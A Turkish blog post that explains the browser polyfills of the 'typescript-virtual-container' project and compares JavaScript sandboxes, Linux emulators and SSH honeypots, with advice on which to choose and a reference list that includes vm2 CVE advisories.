Bir Node.js kütüphanesini tarayıcıda çalıştırmak genellikle bir kabustur. Ya bir Wasm çalışma zamanı kullanırsın (ağır, yüklenmesi yavaş) ya da her `node:*` import'unu elle tarayıcı uyumlu bir alternatifle değiştirmek için haftalar harcarsın. Fortune ikinciyi yaptı -- ama çok temiz bir şekilde, reponun `polyfills/` dizininde yaşayan bir dizi özel polyfill yazarak.

Derleme pipeline'ı, sadece bir yığın `alias` girişi olan esbuild'dir:

```js
// demo/build.js -- tüm tarayıcı derleme yapılandırması
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Wasm yok. Harici polyfill kütüphanesi yok. `webpack-node-externals` saçmalığı yok. Sadece takma adlı modüller ve birkaç enjekte edilmiş global. Her birini inceleyeyim çünkü bazıları gerçekten etkileyici.

**`node:fs` -- sahte dosya sistemi olarak IndexedDB**

Bu benim favorim. `node:fs` polyfill'i, senkron Node.js fs API'sini (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) iki katmanla desteklenen şekilde uygular: senkron okumalar için bellek içi bir `Map` ve sayfa yeniden yüklemeleri arasında kalıcılık için IndexedDB. Yazmalar hemen Map'e gider (böylece `writeFileSync`'ten hemen sonra `readFileSync` her zaman çalışır), ardından arka planda asenkron olarak IndexedDB'ye aktarılır.

```js
// Senkron önbellek (yol → Uint8Array | null) -- anında okumalar
const memCache = new Map();

// Başlangıçta IndexedDB'deki her şeyi memCache'e önceden yükle
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

VFS snapshot'ının tarayıcıda sayfa yeniden yüklemelerinde hayatta kalmasının nedeni budur -- tüm `.vfsb` ikili dosyası bu polyfill aracılığıyla IndexedDB'ye yazılır ve bir sonraki yüklemede geri okunur. Wasm yok. Sunucu yok. Sadece yaklaşık 2011'den beri her tarayıcıda bulunan IndexedDB.

**`node:crypto` -- saf JS'de SHA-256**

Bir Wasm kripto kütüphanesi çekmek yerine, kripto polyfill'i, FIPS 180-4 tur sabitlerini kullanarak SHA-256'yı sıfırdan uygular. Tam hex/base64/Uint8Array çıktı desteğiyle 166 satır saf JS. Kütüphanedeki tüm hash'leme bunun üzerinden gider -- SSH ana bilgisayar anahtarı parmak izi, iç checksum'lar, her şey. Kompakt, sıfır bağımlılık, sadece çalışır.

**`node:os` -- tarayıcının gerçek donanımını okur**

Bu güzel bir dokunuş. Sert kodlanmış yer tutucu değerler döndürmek yerine, `node:os` toplam RAM için `navigator.deviceMemory` ve CPU sayısı için `navigator.hardwareConcurrency` okur. Yani tarayıcı derlemesinin içindeki `neofetch` aslında gerçek makinenle ilgili bir şey bildirir -- uydurma bir `2 çekirdek, 2GB RAM` taslağı değil.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB yedek
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // ayrıca CPU model dizesini tahmin etmek için navigator.userAgent'i ayrıştırır
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- dürüst taslaklar**

Tarayıcı TCP soketleri açamaz veya gerçek SSH çalıştıramaz, bu yüzden bunlar, bir şey onları kullanmaya çalışırsa net bir mesajla `NotImplemented` hatası fırlatan taslaklardır. Sessiz hata yok, bir nesnenin beklendiği yerde `undefined` döndürme yok. Sadece yüksek sesli, net bir "bu tarayıcıda çalışmaz" -- tam olarak istediğin şey.

**`process.js` ve `buffer.js` -- enjekte edilmiş globaller**

Bu ikisi, esbuild'in `inject` seçeneği aracılığıyla paketlenmiş her dosyanın tepesine enjekte edilir, böylece `process` ve `Buffer` herhangi bir açık import olmadan global olarak kullanılabilir. `process.js` küçüktür: `env`, `version`, `platform: 'browser'`, `queueMicrotask` aracılığıyla `nextTick`, `performance.now()` aracılığıyla `uptime`. `buffer.js`, `Uint8Array` üzerinde tam bir `Buffer` yeniden uygulamasıdır -- SSH uygulaması ve VFS'nin dayandığı tüm `readUInt32BE`, `writeInt16LE`, hex/base64 kodlama yöntemleri.

---

Tüm polyfill seti, toplamda yaklaşık 640 satır elle yazılmış JS'dir. npm paketi yok. Wasm yok. Ve sonuç, kütüphanenin kendisi olan, yerel olarak çalışan ve Node-öncelikli kütüphanelerdeki olağan "ama tarayıcıda gerçekten çalışıyor mu?" kaygısı olmayan bir tarayıcı paketidir. Eğer merak ediyorsan, repodaki `polyfills/` klasörüne bir göz atmanı öneririm -- her dosya iyi kapsüllenmiş ve kendi başına okunabilir, ki bu çok takdir ettiğim bir stil seçimi.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Kategori** | JS sandbox | JS sandbox | JS sandbox | Emülatör | Emülatör | Node.js/Wasm | Honeypot | Simülatör |
| **JS izole eder** | ⚠️ kapsam | ✅ V8 Isolate | ✅ Wasm | yok | yok | kısmi | yok | ✅ Worker |
| **Gerçek Linux çekirdeği** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Shell yorumlayıcı** | ❌ | ❌ | ❌ | ✅ (gerçek) | ✅ (gerçek) | ✅ (gerçek) | kısmi | ✅ (özel) |
| **~170 Unix komutu** | ❌ | ❌ | ❌ | ✅ | ✅ | kısmi | ~20 | ✅ |
| **POSIX izinleri** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | kısmi | ✅ zorunlu |
| **Kullanıcı yönetimi** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | ✅ tam |
| **Gerçek SSH sunucusu** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/denetim** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS diff/snapshot** | ❌ | ❌ | ❌ | sınırlı | ❌ | ❌ | ❌ | ✅ |
| **Sanal ağ L2/L3** | ❌ | ❌ | ❌ | temel | ❌ | ❌ | ❌ | ✅ tam |
| **Sanal VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Tarayıcı desteği** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js yerel** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **Tipli API** | temel | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ tam |
| **İkili uyumluluk** | yok | yok | yok | ✅ | ✅ | kısmi | yok | ❌ |
| **Başlatma süresi** | anında | anında | anında | 15–40s | 15–40s | 2–5s | anında | <1s |
| **RAM/örnek** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
| **Çalışma zamanı bağımlılıkları** | 0 | 1 (yerel) | 1 (Wasm) | 0 | özel | 1 | Python bağ. | 3 (ssh2, ws, fflate) |
| **Durum** | kararlı | ✅ aktif | ✅ aktif | ✅ çok aktif | ticari | ✅ aktif | ✅ aktif | ✅ aktif |

---

## Ne zaman hangisine başvurmalı

**Güvenilmeyen JavaScript çalıştırman gerekiyor -- kullanıcı tarafından gönderilen bir formül, bir eklenti, bir script kancası.**  
→ `isolated-vm`. Gerçek V8 Isolate, sert bellek limitleri, açık iletişim köprüsü. `vm2`'den kaçının -- CVE listesi büyümeye devam ediyor, cidden her birkaç ayda bir yenisi çıkıyor. `vm`'den kaçının -- hiç sandbox değil, lütfen.

**JS'yi sandbox'a alman gerekiyor ama yerel bir eklenti istemiyorsun veya tarayıcı uyumluluğuna ihtiyacın var.**  
→ `quickjs-emscripten`. Wasm sınırı, ~500 KB modül, tarayıcı ve Node'da çalışır. V8'den yavaş ama gerçekten izole.

**Gerçek, değiştirilmemiş bir Linux işletim sistemini ikili uyumlulukla başlatman gerekiyor.**  
→ 32-bit Linux için `v86` veya mevcut bir Docker imajın varsa `container2wasm`. 150 MB+ RAM ve 30 saniyelik başlatmayı kabul et, bu anlaşma böyle. 64-bit'e ihtiyacın varsa, CheerpX'e bak veya sadece gerçek bir konteyner çalışma zamanı kullan.

**Bir web uygulamasına backend olmadan Linux benzeri bir terminal gömmek istiyorsun.**  
→ `v86` (tam işletim sistemi, ağır, başlaması yavaş) veya `typescript-virtual-container`'ın tarayıcı paketi (simülatör, daha hafif, anında başlatma, tam bir masaüstü için `startxfce4` içerir ki bu oldukça havalı ngl).

**Etkileşimli çevrimiçi kodlama eğitimleri veya tarayıcı IDE'sine ihtiyacın var.**  
→ Node.js ekosistemi odaklıysan WebContainers. Gerçek bir Linux kullanıcı alanına ihtiyacın varsa CheerpX. Daha hafif bir seçenek ve tipli bir API istiyorsan `typescript-virtual-container`'ın tarayıcı paketi.

**SSH saldırgan TTP'lerini ölçekli olarak toplamak istiyorsun.**  
→ Cowrie production standardıdır, nokta. Herhangi bir Linux sunucusunda çalışır, her SIEM ile entegre olur, artık LLM modu var. Sadece Cowrie kullan.

**Bir Node.js uygulamasında programatik API ile SSH honeypot verisi istiyorsun.**  
→ `typescript-virtual-container`. Komutlar gerçekten yürütülür. VFS, snapshot'ını alıp diff'ini yapabileceğin gerçek bir veri yapısıdır. Saldırgan inandırıcı, etkileşimli bir ortam alır ve sen Node'dan ayrılmadan yapılandırılmış denetim verisi alırsın.

**Docker olmadan CI'da shell otomasyonu / testi yapman gerekiyor.**  
→ `typescript-virtual-container`. Bir saniyeden kısa sürede başlat, testten önce snapshot al, sonra geri yükle. Tipli API ile shell komutları çalıştır. Docker daemon'u yok, çekirdek yok, VM yok, bekleme yok.

**Çok kiracılı shell ortamlarına ihtiyacın var (SaaS, eğitim, öğretim).**  
→ `typescript-virtual-container`. Örnek başına 5–20 MB, emülatör için 150–256 MB'a karşı. 100 eşzamanlı kullanıcı: ~2 GB'a karşı ~25 GB. Barındırma maliyetlerinde büyük fark!

**Aynı zamanda çoklu VM ağ laboratuvarı inşa etmene izin veren gerçekçi bir honeypot'a ihtiyacın var.**  
→ `typescript-virtual-container` bu alanda ikisini de yapan tek şey.

---

## Yapamadığı şeyler (ve bu konuda dürüst olmak istiyorum)

Yerel x86 ikili dosyalarını çalıştıramaz. C kodu derlemen, gerçek bir Python yorumlayıcı çalıştırman veya Linux için derlenmiş yazılım kullanman gerekiyorsa, bu syscall'ları destekleyecek bir çekirdek ABI'si yoktur. `gcc`, `python3` ve `node` gibi komutlar taslaktır -- `--version` ve yaygın kullanımlara yanıt verirler, ancak gerçek bir şey yürütmezler.

Bu temel takastır: 10–50 kat daha düşük bellek, anında başlatma, tarayıcı uyumluluğu, tipli bir API, gerçek SSH ve sanal ağ kazanırsın -- ve Linux kullanıcı alanıyla ikili uyumluluktan vazgeçersin.

Fortune, projeyi tasarlarken bunu çok düşündü. Hedeflediği kullanım durumları için -- honeypot'lar, test, gömülü terminaller, CI ortamları -- derlenmiş bir ikili dosyayı çalıştırmak aslında asla gerekmez. Shell pipeline'ları, dosya manipülasyonu, ağ yönlendirmesi ve SSH her şeyi kapsar. Ancak kullanım durumun gerçek derlenmiş yazılım gerektiriyorsa, `v86` veya Docker doğru cevaptır, bu değil.

---

## Toparlarken

Veeeee evet. Bu ekosistem, dışarıdan göründüğünden daha geniş ve daha parçalanmış. `vm` bir kapsam ayırıcıdır, sandbox değil. `vm2` CVE biriktirmeye devam ediyor (cidden, bu ayın danışma notlarını kontrol et). `isolated-vm` doğru JS sandbox'lama cevabıdır ama sadece JS. `quickjs-emscripten`, tarayıcı uyumluluğuna ihtiyacın olduğunda veya yerel eklentilerden kaçınmak istediğinde doğru seçimdir. `v86` ve CheerpX, gerçek ikili uyumluluğa ihtiyacın olduğunda gerçek emülatörlerdir. WebContainers, Wasm'de Node.js'dir, genel bir Linux ortamı değil. Cowrie, SSH honeypot altın standardıdır ama Python'dur ve Node-yerel değildir.

Ve sonra `typescript-virtual-container` var -- Fortune'un projesi -- kendi kategorisinde yaşayan bir şey. Bir emülatör değil, bir JS sandbox'ı değil, pasif bir honeypot değil. Hepsinin arasında, diğerlerinin hiçbirinin yapamadığı birçok şey için şaşırtıcı derecede kullanışlı olduğu ortaya çıkan bir şey.

`typescript-virtual-container`, diğerlerinin hiçbirinin dokunmadığı boşluğu doldurur: gerçek SSH, SFTP, POSIX izinleri, kullanıcı yönetimi, sanal ağ ve tipli bir TypeScript API ile ~10 MB'da çalışan, bir saniyeden kısa sürede başlayan, hem Node.js'de hem de tarayıcıda çalışan eksiksiz, programatik bir Linux shell ortamı.

Denemek istersen: kaynak [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) adresinde ve tam bir masaüstü için `startxfce4` de dahil canlı bir demo (ki bu cidden hasta) [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo) adresinde. Git bir göz at ve Fortune'a GitHub'da biraz yıldız ver, bunu hak ediyor!

Okuduğun için teşekkürler -- bu benim standartlarıma göre bile çok uzundu :) umarım faydalı olmuştur!

---

## Kaynaklar

Her iddiayı bir birincil kaynağa bağlamaya çalıştım -- CVE danışma notları, resmi dokümanlar, GitHub repoları, bakımcıların blog yazıları. Birkaç not: vm2 CVE listesi büyümeye devam ediyor, bu yüzden FortiGuard bağlantısı bunu okuduğun zamana kadar güncelliğini kaybetmiş olabilir (en sonuncusu için GitHub danışma sayfasını kontrol et). Bellard bağlantılarının hepsi kararlıdır -- kişisel sitesi sonsuza kadar açıktır ve içerik değişmez. Ve polyfill'ler hakkında daha derine inmek istersen, doğrudan `typescript-virtual-container` reposundaki `polyfills/` klasörüne göz at -- burada yazabileceğim herhangi bir açıklamadan daha okunabilir.

### JavaScript sandbox'ları

- **Node.js `vm` modülü** -- resmi dokümantasyon: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm` güvenlik uyarısı** -- "vm modülü bir güvenlik mekanizması değildir. Güvenilmeyen kodu çalıştırmak için kullanmayın": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE zaman çizelgesi** -- FortiGuard salgın uyarısı, tam CVE listesi ve tarihlerle: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- async hata yığını kaçışı, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function kaçışı, PoC gist: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Exploit DB girişi, tam PoC ile: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **vm2 2026 CVE'leri** -- 11 yeni sandbox kaçışı, analiz: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"JS'yi JS'de Sandbox'a Alma Neden Zordur"** -- oxeye.io'nun CVE-2022-36067 otopsisi: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate iç yapısı** -- gömme rehberi: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS motoru** -- Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno izin modeli** -- doküman: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 sürümü** -- Ekim 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm teklifi** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments teklifi** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"JavaScript Kodunu Sandbox'a Alma"** -- Andrew Healey'in Deno sandbox yaklaşımı hakkında pratik yazısı: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux emülatörleri

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **v86 işletim sistemi destek matrisi** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (v86 tarafından kullanılan BIOS) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE uzantıları** (VGA referansı) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Bellard'ın emülatörü: [bellard.org/jslinux](https://bellard.org/jslinux/) · Teknik notlar (TinyEMU, tarihçe, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- C kaynağı: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Gayriresmi GitHub yansıları: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- OpenRISC JS emülatörü: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- doküman: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads rehberi: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API dokümanı: [webcontainers.io](https://webcontainers.io) · Duyuru: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ genel bakış: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT blog yazısı: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison yazısı: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Terminal yığını

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypot'lar

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Doküman: [docs.cowrie.org](https://docs.cowrie.org) · Site: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (arşivlenmiş): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- minimal Node.js SSH honeypot: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- düzenlenmiş liste: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Sistem Bilgisi Keşfi (saldırganların honeypot'ları nasıl parmak iziyle tespit ettiği): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Canlı demo**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Mimari rehberi**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH protokol uygulaması) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (VFS snapshot sıkıştırması) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (WebSocket shell taşıması) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Arka plan okumaları

- **POSIX izin modeli** -- Open Group spec: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Yazma-önde günlüğü** (VFS kalıcılığında kullanılan desen) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate modeli** -- "Gömücü Rehberi": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA spec** (TinyEMU/JSLinux bağlamı için) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000 mimarisi** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Pyodide sandbox'ında Deno aracılığıyla Python kodu çalıştırma"** -- Simon Willison TIL, Wasm yaklaşımıyla faydalı bir karşılaştırma: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Kendi kendine barındırılan QuickJS'yi tarayıcıda çalıştırma"** -- Simon Willison TIL, quickjs-emscripten paket boyutu hakkında: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
